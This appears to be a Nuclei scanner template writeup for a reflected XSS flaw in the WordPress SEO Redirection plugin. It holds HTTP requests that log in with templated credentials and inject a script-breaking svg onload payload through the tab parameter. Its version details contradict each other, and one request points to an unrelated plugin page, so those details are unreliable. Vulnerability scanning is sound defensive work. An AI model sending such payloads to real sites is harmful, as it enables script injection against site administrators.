# Nuclei Template: WordPress SEO Redirection <7.4 - Cross-Site Scripting
**Template ID:** seo-redirection-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`seo-redirection-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress SEO Redirection 7.4 does not escape the tab parameter before outputting it back in JavaScript code, leading to a reflected cross-site scripting vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

POST /wp-admin/options-general.php?page=seo-redirection.php&tab=cutom HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

tab=%3C%2Fscript%3E%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%3E

GET /wp-admin/admin.php?page=wpda_duplicate_post_menu HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Fixed in version 7.4.

## References
- https://wpscan.com/vulnerability/b694b9c0-a367-468c-99c2-6ba35bcf21ea
